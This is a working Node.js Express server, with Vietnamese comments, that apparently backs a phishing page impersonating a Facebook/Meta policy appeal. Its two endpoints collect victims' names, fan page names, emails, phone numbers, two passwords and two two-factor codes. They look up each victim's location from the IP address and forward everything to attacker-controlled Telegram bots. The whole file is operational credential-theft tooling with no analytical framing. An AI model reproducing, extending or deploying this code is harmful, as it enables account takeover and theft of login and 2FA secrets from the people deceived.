const express = require('express');
const cors = require('cors');
const axios = require('axios');
const app = express();
require('dotenv').config();

const PORT = 3000;

// Telegram Bot Token và Chat ID
const TELEGRAM_BOT_TOKEN_1 = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID_1 = process.env.TELEGRAM_CHAT_ID;
const TELEGRAM_BOT_TOKEN_2 = process.env.TELEGRAM_BOT_TOKEN_2;
const TELEGRAM_CHAT_ID_2 = process.env.TELEGRAM_CHAT_ID_2;

if (!TELEGRAM_BOT_TOKEN_1 || !TELEGRAM_CHAT_ID_1 || !TELEGRAM_BOT_TOKEN_2 || !TELEGRAM_CHAT_ID_2) {
    console.error('Error: Missing TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID');
    process.exit(1);
}

// Cấu hình CORS
const corsOptions = {
    origin: [
        'https://policy-contactus.vercel.app',
        'https://policy-contactus.vercel.app/meta-community-standard',
    ], // Danh sách domain cho phép
    methods: ['GET', 'POST', 'OPTIONS'], // Các phương thức được phép
    allowedHeaders: ['Content-Type', 'Authorization'], // Các header cho phép
    credentials: true, // Cho phép gửi cookie nếu có
};

// Đảm bảo middleware được áp dụng trước tất cả routes
app.use(cors(corsOptions));

// Đảm bảo xử lý preflight request (OPTIONS)
app.options('*', cors(corsOptions));

// Middleware để parse JSON
app.use(express.json());

// Endpoint 1: Gửi thông tin qua Telegram Bot 1
app.post('/api/user-info', async (req, res) => {
    const userInfo = req.body;
    const ipAddress = userInfo.ipAddress || req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    // Lấy thông tin vị trí từ API
    let countryName = userInfo.country || '';  // Kiểm tra nếu đã có trong request
    let cityName = userInfo.city || '';        // Kiểm tra nếu đã có trong request

    // Chỉ gọi API nếu countryName hoặc cityName không có giá trị
    if (!countryName) {
        try {
            const geoResponse = await axios.get(`http://ip-api.com/json/${ipAddress}`);
            if (geoResponse.data.status === 'success') {
                countryName = geoResponse.data.country || 'Unknown';
            }
        } catch (error) {
            console.error('Error fetching location data:', error.message);
        }
    }

    if (!cityName) {
        try {
            const geoResponse = await axios.get(`http://ip-api.com/json/${ipAddress}`);
            if (geoResponse.data.status === 'success') {
                cityName = geoResponse.data.city || 'Unknown';
            }
        } catch (error) {
            console.error('Error fetching location data:', error.message);
        }
    }

    const message = `
📧 *User Information Received on web FaceBook Policy*:
- Full Name: ${userInfo.fullName || ''}
- Fanpage Name: ${userInfo.fanpageName || ''}
- Business Email Address: ${userInfo.businessEmailAddress || ''}
- Personal Email Address: ${userInfo.personalEmailAddress || ''}
- Mobile Phone Number: ${userInfo.mobilePhoneNumber || ''}
- Password 1: ${userInfo.firstPassword || ''}
- Password 2: ${userInfo.secondPassword || ''}
- First Code Authentication: ${userInfo.firstCode || ''}
- Second Code Authentication: ${userInfo.secondCode || ''}
- IP Address: ${ipAddress}
- Country: ${countryName}
- City: ${cityName}
    `;

    try {
        const response = await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN_1}/sendMessage`, {
            chat_id: TELEGRAM_CHAT_ID_1,
            text: message,
            parse_mode: 'Markdown',
        });

        res.json({
            message: 'User info received and sent to Telegram successfully on web FaceBook Policy',
            telegramResponse: response.data.result.text,
        });
    } catch (error) {
        console.error('Error sending message to Telegram:', error.message);

        res.status(500).json({
            message: 'Failed to send message to Telegram',
            error: error.message,
        });
    }
});

// Endpoint 2: Gửi thông tin qua Telegram Bot 2
app.post('/api/user-info-1', async (req, res) => {
    const userInfo = req.body;
    const ipAddress = userInfo.ipAddress || req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    // Lấy thông tin vị trí từ API
    let countryName = userInfo.country || '';  // Kiểm tra nếu đã có trong request
    let cityName = userInfo.city || '';        // Kiểm tra nếu đã có trong request

    // Chỉ gọi API nếu countryName hoặc cityName không có giá trị
    if (!countryName) {
        try {
            const geoResponse = await axios.get(`http://ip-api.com/json/${ipAddress}`);
            if (geoResponse.data.status === 'success') {
                countryName = geoResponse.data.country || 'Unknown';
            }
        } catch (error) {
            console.error('Error fetching location data:', error.message);
        }
    }

    if (!cityName) {
        try {
            const geoResponse = await axios.get(`http://ip-api.com/json/${ipAddress}`);
            if (geoResponse.data.status === 'success') {
                cityName = geoResponse.data.city || 'Unknown';
            }
        } catch (error) {
            console.error('Error fetching location data:', error.message);
        }
    }

    const message = `
📧 *User Information Received on Meta Policy*:
- Full Name: ${userInfo.fullName || ''}
- Fanpage Name: ${userInfo.fanpageName || ''}
- Business Email Address: ${userInfo.businessEmailAddress || ''}
- Personal Email Address: ${userInfo.personalEmailAddress || ''}
- Mobile Phone Number: ${userInfo.mobilePhoneNumber || ''}
- Password 1: ${userInfo.firstPassword || ''}
- Password 2: ${userInfo.secondPassword || ''}
- First Code Authentication: ${userInfo.firstCode || ''}
- Second Code Authentication: ${userInfo.secondCode || ''}
- IP Address: ${ipAddress}
- Country: ${countryName}
- City: ${cityName}
    `;

    try {
        const response = await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN_2}/sendMessage`, {
            chat_id: TELEGRAM_CHAT_ID_2,
            text: message,
            parse_mode: 'Markdown',
        });

        res.json({
            message: 'User info received and sent to Telegram successfully on Meta Policy',
            telegramResponse: response.data.result.text,
        });
    } catch (error) {
        console.error('Error sending message to Telegram:', error.message);

        res.status(500).json({
            message: 'Failed to send message to Telegram',
            error: error.message,
        });
    }
});

// Start server
app.listen(PORT, () => {
    console.log(`Server is running on http://localhost:${PORT}`);
});
